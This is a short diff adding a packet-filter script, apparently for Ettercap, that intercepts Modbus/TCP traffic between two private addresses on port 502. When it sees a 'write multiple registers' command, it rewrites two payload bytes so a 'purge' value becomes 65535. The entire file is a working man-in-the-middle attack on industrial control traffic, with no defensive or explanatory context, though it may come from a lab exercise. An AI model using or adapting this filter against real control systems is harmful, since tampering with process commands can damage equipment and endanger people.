@@ -1,0 +1,8 @@
+# manipulate purge command to 65536
+
+if (ip.src == '192.168.95.2' && ip.dst == '192.168.95.12') {
+    if (tcp.dst == 502 && DATA.data + 7 == 0x10) {
+        DATA.data + 13 = 0xff;
+        DATA.data + 14 = 0xff;
+    }
+}
